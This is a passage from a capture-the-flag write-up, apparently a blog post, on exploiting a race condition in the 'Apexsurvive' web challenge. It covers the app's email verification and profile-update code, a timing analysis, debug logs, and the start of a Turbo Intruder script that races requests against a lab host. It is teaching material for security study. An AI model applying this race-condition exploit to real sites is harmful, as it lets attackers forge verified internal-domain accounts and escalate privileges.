+<p>I was determined that my theorized attack chain flowchart is correct. I just needed a way to gain <code>isInternal</code>!</p>
+<p>I spent hours and hours staring at the same code. Taking notes, speaking out the situation, writing the steps of the code down, going through the verification process multiple times.</p>
+<p>I eliminated the possibility of reading an inbox other than that of <code>test@email.htb</code>.</p>
+<blockquote>
+<p>Later on, I found an interesting solution that was able to directly interact with the mail server, fetching emails for other users using a &ldquo;DNS rebinding attack&rdquo;, super interesting attack.</p>
+</blockquote>
+<p>I layed out the atomic requirements for gaining <code>isInternal</code>:</p>
+<ol>
+<li>Our email must be <code>test@email.htb</code>, at least when the email is sent.</li>
+<li>Our email must have <code>@apexsurvive.htb</code> at least at token generation.</li>
+</ol>
+<p>I kept cycling these two requirements around, going through the code, manually tracing the verification process, until it occurred to me that these condition are not necessarily mutually exclusive. With proper&hellip; timing, we perhaps could achieve both requirements.</p>
+<p>I think we might have a <strong>Race Condition!</strong></p>
+<p>Let&rsquo;s write down a demo attack timeline to better visualize the feasibility of a race condition including the two code paths we need to run in parallel, I will give three-letter nicknames for critical functions within each path:</p>
+<ul>
+<li><code>svf: sendVerification</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#39;/sendVerification&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@isAuthenticated</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sanitizeInput</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendVerification</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> getUser(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;isConfirmed&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;unverified&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> checkEmail(user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>]):
+</span></span><span style="display:flex;"><span>    sem <span style="color:#f92672">--&gt;</span> sendEmail(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>), user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>])
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Verification link sent!&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;Invalid Email&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#39;User already verified!&#39;</span>)
+</span></span></code></pre></div><ul>
+<li><code>sem: sendVerification → sendEmail</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendEmail</span>(userId, to):
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> getToken(userId)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> generateTemplate(token[<span style="color:#e6db74">&#39;confirmToken&#39;</span>], token[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> Message(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Account Verification&#39;</span>,
+</span></span><span style="display:flex;"><span>        recipients<span style="color:#f92672">=</span>[to],
+</span></span><span style="display:flex;"><span>        body<span style="color:#f92672">=</span>data,
+</span></span><span style="display:flex;"><span>        sender<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-reply@apexsurvive.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    mail<span style="color:#f92672">.</span>send(msg)
+</span></span></code></pre></div><ul>
+<li><code>upf: updateProfile</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">updateProfile</span>(id, email, fullName, username):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> query(<span style="color:#e6db74">&#39;SELECT * FROM users WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (id, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>] <span style="color:#f92672">==</span> email <span style="color:#f92672">or</span> user[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">==</span> email:
+</span></span><span style="display:flex;"><span>        query(<span style="color:#e6db74">&#39;UPDATE users SET username=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, fullName=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (username, fullName, id, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        mysql<span style="color:#f92672">.</span>connection<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> query(<span style="color:#e6db74">&#39;SELECT email, unconfirmedEmail FROM users WHERE email=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> OR unconfirmedEmail=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (email, email,) ,one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> user:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        randomToken <span style="color:#f92672">=</span> uuid4()
+</span></span><span style="display:flex;"><span>        query(<span style="color:#e6db74">&#39;UPDATE users SET email=&#34;&#34;, unconfirmedEmail=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, confirmToken=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, fullName=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, isConfirmed=&#34;unverified&#34;, username=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (email, randomToken, fullName, username, id, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        mysql<span style="color:#f92672">.</span>connection<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;email changed&#39;</span>
+</span></span></code></pre></div><p>We could theoretically send a verification email to our current address (<code>test@email.htb</code>) and right before the mail sending logic fetches the user&rsquo;s current token (using <code>getToken(userId)</code>), we could trigger a profile update to <code>hacker@apexsurvive.htb</code>, hence we receive an elevated, <code>isInternal</code> token that is sent to our <code>test@email.htb</code> inbox!</p>
+<p>Is that feasible? Let&rsquo;s make an &ldquo;execution timeline&rdquo; to see if there is a specific call order that can trigger the theorized RC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># initial state = test@email.htb ---</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. svf: test@email.htb has confirmToken1</span>
+</span></span><span style="display:flex;"><span>svf: sendVerification()
+</span></span><span style="display:flex;"><span>svf: user <span style="color:#f92672">=</span> getUser(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. sem: to test@email.htb</span>
+</span></span><span style="display:flex;"><span>svf:	<span style="color:#f92672">-&gt;</span> sendEmail()
+</span></span><span style="display:flex;"><span>upf: updateProfile(id, email, fullName, username):
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. generate confirmToken2</span>
+</span></span><span style="display:flex;"><span>upf:	<span style="color:#f92672">-&gt;</span> randomToken <span style="color:#f92672">=</span> uuid4()
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. confirmToken2 belongs to @apexsurvive email!</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">-&gt;</span> query(<span style="color:#e6db74">&#39;UPDATE users SET email=&#34;&#34;, unconfirmedEmail=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, confirmToken=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, fullName=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, isConfirmed=&#34;unverified&#34;, username=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (email, randomToken, fullName, username, id, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 5. sendVerification resumes, querying confirmToken2 from DB</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># based on `id` even though email changed</span>
+</span></span><span style="display:flex;"><span>svf:	  <span style="color:#f92672">-&gt;</span> token <span style="color:#f92672">=</span> getToken()
+</span></span><span style="display:flex;"><span>svf:	     <span style="color:#f92672">-&gt;</span> query(<span style="color:#e6db74">&#39;SELECT unconfirmedEmail, confirmToken FROM users WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (id, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 6. confirmToken2 delivered to our test@email.htb inbox despite email change!</span>
+</span></span><span style="display:flex;"><span>svf:      <span style="color:#f92672">-&gt;</span> mail<span style="color:#f92672">.</span>send(msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RC attack succeeded: @apexsurvive.htb token landed in our test@email.htb mailbox!</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hit /verify with the received token to gain internal.</span>
+</span></span></code></pre></div><blockquote>
+<p>Essentially, we must call <code>sendVerification</code> and <code>updateProfile</code> simultaneously in a way that gives us the chance to update our mail <em>after</em> <code>sendVerification</code> has executed its <code>getUser</code> and before its <code>sendEmail</code>.</p>
+<p>During that miniscule, critical period, <code>updateProfile</code> must set our new email and <code>confirmaToken</code> in the database such that when <code>sendVerification → sendEmail</code> queries the token based on user ID, it gets <code>@apexsurvive.htb</code>&rsquo;s token and sends it to the email it was initially called with <code>test@email.htb</code>, delivering it to our inbox.</p>
+</blockquote>
+<p>To be frank, I have never exploited a race condition before. The concept itself was very novel to me and I was not sure if it is intended, let alone feasible.</p>
+<p>Sometimes, security research becomes an exercise of <em>uncertainty management</em>; an exercise in treading the unknown, following a hazy, obscure path without validation.</p>
+<p>And while a shot in the dark could work sometime, we do not want to rely on chance. We will always want to illuminate our path to enable deliberate, effective action.</p>
+<p>This <em>illumination</em> can be done through modelling and experimentation or via secondary research.</p>
+<p>So I started to read about race conditions.</p>
+<p>From <a href="https://book.hacktricks.xyz/pentesting-web/race-condition">Hack Tricks</a>:</p>
+<blockquote>
+<p>&ldquo;The main hurdle in taking advantage of race conditions is making sure that multiple requests are handled at the same time, with very little difference in their processing times—ideally, less than 1ms.&rdquo;</p>
+</blockquote>
+<p>Also within the same page under <em>Confirm other emails</em>:</p>
+<blockquote>
+<p>&ldquo;The idea is to verify an email address and change it to a different one at the same time to find out if the platform verifies the new one changed.&rdquo;</p>
+</blockquote>
+<p>Whoa! This is surreally similar to what we have here.</p>
+<p>Next is <a href="https://portswigger.net/research/smashing-the-state-machine#single-packet-attack">Smashing the State Machine</a> by James Kettle which turned out to be a gold mine.</p>
+<p>Reading through the predictors of a collision, our problem seems to check all the boxes!</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Data is kept in a persistent store.</li>
+<li><input checked="" disabled="" type="checkbox"> We are editing a record, rather than appending.</li>
+<li><input checked="" disabled="" type="checkbox"> The two racing operations are keyed on a fixed column, <code>id</code>!</li>
+</ul>
+<p>I devoured that entire article, it is very concise, on-point and a total masterpiece. Not only was it extremely relevant for our app, it also provided a framework for discovering, reasoning about and approaching race conditions and any time-sensitive vulnerability in general.</p>
+<p>A very important section explained Kettle&rsquo;s race condition finding in Devise, a popular authentication framework in the Ruby ecosystem:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/devise-rc.png"></p>
+<p>The similarity is so stark, down to variable names, and I cannot help but think the challenge author must have taken some inspiration from this exact article.</p>
+<p>At this point, we have successfully persevered through uncertainty. We are no longer flailing at the dark, we know what we are dealing with and it looks more promising than ever.</p>
+<p>Let&rsquo;s try a little proof-of-concept by locally patching <code>sendVerification</code> to include a 5 second delay as so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendVerification</span>(decodedToken):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> getUser(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;isConfirmed&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;unverified&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> checkEmail(user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>]):
+</span></span><span style="display:flex;"><span>            sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>            sendEmail(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>), user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
+</span></span></code></pre></div><p>We have added debug points to all critical functions to see the precise execution timeline of our race condition.</p>
+<p>I then attempted to manually trigger the race condition, setting initial state to use <code>test@email.htb</code>, triggering <code>sendVerification</code>, then updating email to <code>hacker@apexsurvive.htb</code> within the sleep duration, before the email is sent.</p>
+<p>In the logs, everything went exactly as our annotated timeline above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811049</span> [<span style="color:#f92672">+</span>] <span style="color:#f92672">/</span>sendVerification: Entered
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811753</span> [<span style="color:#f92672">+</span>] sendVerification grabbed <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#39;id&#39;</span>: <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;password&#39;</span>, <span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>: <span style="color:#e6db74">&#39;test@email.htb&#39;</span>, <span style="color:#e6db74">&#39;confirmToken&#39;</span>: <span style="color:#e6db74">&#39;e3ab2f88-385c-4b4f-aef0-d9aa94cf81d7&#39;</span>, <span style="color:#e6db74">&#39;fullName&#39;</span>: <span style="color:#e6db74">&#39;aaa&#39;</span>, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;bbb&#39;</span>, <span style="color:#e6db74">&#39;isConfirmed&#39;</span>: <span style="color:#e6db74">&#39;unverified&#39;</span>, <span style="color:#e6db74">&#39;isInternal&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span>, <span style="color:#e6db74">&#39;isAdmin&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811797</span> [<span style="color:#f92672">+</span>] sendVerification: Sleeping <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> seconds
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">290595</span> [<span style="color:#f92672">+</span>] <span style="color:#f92672">/</span>profile: Entered
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">290635</span> [<span style="color:#f92672">+</span>] <span style="color:#f92672">/</span>profile: calling updateProfile()
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">290640</span> [<span style="color:#f92672">+</span>] updateProfile: Entered
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">291569</span> [<span style="color:#f92672">+</span>] updateProfile: Generating random token <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">new</span> email since <span style="color:#66d9ef">no</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">exists</span> <span style="color:#66d9ef">with</span> test<span style="color:#f92672">@</span>apexsurvive.htb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">292197</span> [<span style="color:#f92672">+</span>] updateProfile: Updated token
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">302563</span> [<span style="color:#f92672">+</span>] updateProfile: <span style="color:#66d9ef">SQL</span> <span style="color:#66d9ef">commit</span>()
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">302609</span> [<span style="color:#f92672">+</span>] sendEmail: Querying token...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">302882</span> [<span style="color:#f92672">+</span>] sendEmail: Grabbed token: <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>: <span style="color:#e6db74">&#39;test@apexsurvive.htb&#39;</span>, <span style="color:#e6db74">&#39;confirmToken&#39;</span>: <span style="color:#e6db74">&#39;696a019c-e4d2-4457-b53b-d73b6605463b&#39;</span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">48</span>.<span style="color:#ae81ff">304258</span> [<span style="color:#f92672">+</span>] sendEmail: Actually sending email now...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">816839</span> [<span style="color:#f92672">+</span>] sendVerification: calling sendEmail() sending <span style="color:#66d9ef">to</span> test<span style="color:#f92672">@</span>email.htb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">816885</span> [<span style="color:#f92672">+</span>] sendEmail: Querying token...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">817290</span> [<span style="color:#f92672">+</span>] sendEmail: Grabbed token: <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>: <span style="color:#e6db74">&#39;test@email.htb&#39;</span>, <span style="color:#e6db74">&#39;confirmToken&#39;</span>: <span style="color:#e6db74">&#39;e3ab2f88-385c-4b4f-aef0-d9aa94cf81d7&#39;</span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">818532</span> [<span style="color:#f92672">+</span>] sendEmail: Actually sending email now...
+</span></span></code></pre></div><p>But looking at our inbox, nothing happens. The email sent to us is typical, containing <code>test@email.htb</code> and its token. What?!</p>
+<p>Shouldn&rsquo;t <code>sendEmail: Querying token...</code> at <code>15:15:51.81</code> be querying the newly generated token <code>696a019c-e4d2-4457-b53b-d73b6605463b</code>?</p>
+<p>How is the old token, which should have been overwritten in the database at <code>15:15:48</code> by <code>updateProfile: SQL commit()</code>, still available?</p>
+<p>This, I have no answer for.</p>
+<p>I suspect it is something to do with MariaDB transactions, it might be related to the way <code>sleep</code> works, or perhaps I misidentified the race condition&rsquo;s critical region. Either way, I found this behavior perplexing. If someone has an explanation, please let me know in the comments.</p>
+<p>Next, I tried to automate this process using <code>threading</code>, maybe the manual approach was not fast enough? It shouldn&rsquo;t have to be fast anyways since we added a sleep there. Anyways, I still looked up samples using <code>aiohttp</code> and <code>asyncio</code> for concurrency, but to no avail, same result.</p>
+<h3 id="winning-the-race">Winning the Race<a href="#winning-the-race" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Few more hours passed and I am still staring at the same code. I know there is a race condition, I am just unable to exploit it.</p>
+<p>In &ldquo;Smashing the state machine&rdquo; the author mentioned how we could minimize the effects of network jitter by abusing network protocols.</p>
+<p>One method is called the <strong>single-packet attack</strong> where we fit two HTTP requests onto a single TCP packet essentially eliminating network jitter since we guarantee their concurrent arrival.</p>
+<p>The problem with this method is, it does not eliminate server-side jitter. In our instance, we have so many layers including <code>nginx</code>, <code>uwsgi</code>, and <code>flask</code> itself, this makes exploitation highly unreliable.</p>
+<blockquote>
+<p>&ldquo;I spotted an opportunity to adapt a trick from the HTTP/1.1 &rsquo;last-byte sync&rsquo; technique. Since servers only process a request once they regard it as complete, maybe by withholding a tiny fragment from each request we could pre-send the bulk of the data, then &lsquo;complete&rsquo; 20-30 requests with a single TCP packet&rdquo;</p>
+<ul>
+<li>James Kettle, Smashing the state machine</li>
+</ul>
+</blockquote>
+<p>From the same article, turns out we could perform a last-byte sync attack using <strong>Turbo Intruder</strong>, a Burp Suite extension written by Kettle himself.</p>
+<blockquote>
+<p>I later found that this feature is available in good ol&rsquo; <strong>Repeater</strong> where you could group multiple requests before sending them in parallel. - me</p>
+</blockquote>
+<p>So, let&rsquo;s send a request over to Turbo Intruder:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/turbo-intruder-send.png"></p>
+<p>With a bit of experimentation, I wrote a script based off Turbo Intruder&rsquo;s <code>race-multi-endpoint</code> preset:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">queueRequests</span>(target, wordlists):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    engine <span style="color:#f92672">=</span> RequestEngine(endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://192.168.1.253:1337&#39;</span>,
+</span></span><span style="display:flex;"><span>                           concurrentConnections<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>                           engine<span style="color:#f92672">=</span>Engine<span style="color:#f92672">.</span>BURP2
+</span></span><span style="display:flex;"><span>                           )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    send_verification <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;GET /challenge/api/sendVerification HTTP/2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 192.168.1.253:1337
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwNzAzODc4LCJhbnRpQ1NSRlRva2VuIjoiM2Y1ZGYyMDItZTYxNS00OTM3LThhZDMtYmUyNGI2ZTI0NjFkIn0.DVS8rauCz8CO5ciPDrilAIF04oGmuXefAcW4ueyNx4s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept: */*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Language: en-US,en;q=0.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Encoding: gzip, deflate, br
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Referer: https://192.168.1.253:1337/challenge/settings?message=verify
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Dest: empty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Mode: cors
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Site: same-origin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Te: trailers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    update_profile <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;POST /challenge/api/profile HTTP/2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 192.168.1.253:1337
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwNzAzODc4LCJhbnRpQ1NSRlRva2VuIjoiM2Y1ZGYyMDItZTYxNS00OTM3LThhZDMtYmUyNGI2ZTI0NjFkIn0.DVS8rauCz8CO5ciPDrilAIF04oGmuXefAcW4ueyNx4s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept: */*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Language: en-US,en;q=0.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Encoding: gzip, deflate, br
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Referer: https://192.168.1.253:1337/challenge/settings?message=verify
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 109
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Origin: https://192.168.1.253:1337
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Dest: empty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Mode: cors
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sec-Fetch-Site: same-origin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Te: trailers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">email=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&amp;username=aelmo&amp;fullName=aelmo&amp;antiCSRFToken=3f5df202-e615-4937-8ad3-be24b6e2461d&amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
